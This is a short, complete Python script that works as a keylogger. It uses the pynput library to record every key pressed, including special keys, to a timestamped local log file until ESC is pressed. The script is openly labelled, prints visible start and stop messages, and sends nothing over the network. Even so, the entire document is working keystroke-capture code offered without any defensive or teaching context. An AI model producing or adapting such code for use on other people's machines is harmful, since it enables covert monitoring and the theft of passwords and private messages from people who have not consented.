from pynput import keyboard
import logging
from datetime import datetime

# Create a log file with a timestamp to avoid overwriting
log_filename = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

# Configure logging
logging.basicConfig(filename=log_filename, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        # Special keys (like shift, ctrl, etc.)
        logging.info(f'Special key pressed: {key}')

def on_release(key):
    # Stop the keylogger if Esc is pressed
    if key == keyboard.Key.esc:
        print("[INFO] ESC pressed, exiting keylogger.")
        return False

print("[INFO] Keylogger started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
